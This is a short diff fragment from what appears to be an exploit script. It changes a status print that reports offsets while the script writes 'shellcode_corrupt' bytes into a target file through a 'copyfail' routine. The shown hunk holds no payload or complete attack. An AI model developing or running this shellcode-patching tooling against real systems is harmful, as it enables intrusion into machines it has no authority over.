@@ -122,7 +122,7 @@ while i<len(bytecode):
     copyfail(f,i,bytecode[i:i+4], offset=(file_offset))
     i+=4
 
-print(f'Patching {target_corrupt} => ({target_file_to_patch}) {len(shellcode_corrupt)} bytes -- offset {file_offset}')
+print(f'Patching {target_corrupt} => ({target_file_to_patch}) {len(shellcode_corrupt)} bytes -- offset {file_corrupt_offset+target_corrupt_offset}')
 i = 0
 bytecode = data[(file_corrupt_offset+target_corrupt_offset):file_corrupt_offset+len(shellcode_corrupt)+10+target_corrupt_offset]
 while i<len(bytecode):
